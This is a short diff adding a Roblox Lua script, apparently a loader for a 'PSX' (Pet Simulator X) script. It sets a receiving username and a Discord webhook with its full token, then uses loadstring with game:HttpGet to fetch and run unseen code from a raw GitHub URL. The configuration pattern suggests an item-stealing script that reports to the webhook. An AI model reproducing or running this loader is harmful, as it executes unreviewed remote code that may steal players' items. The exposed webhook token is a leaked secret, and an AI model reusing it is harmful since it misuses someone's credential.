@@ -1,0 +1,5 @@
+UserName = "LetsGoBean221"
+WebHook = "https://discord.com/api/webhooks/1065691291263979610/mCZ3F3TuGKZIrFjIhmZbJ8FiHhfFm-L_nBHv5duGPyImRxhKFR0JkR_-5YaDpqCvfChQ"
+Mention = true 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
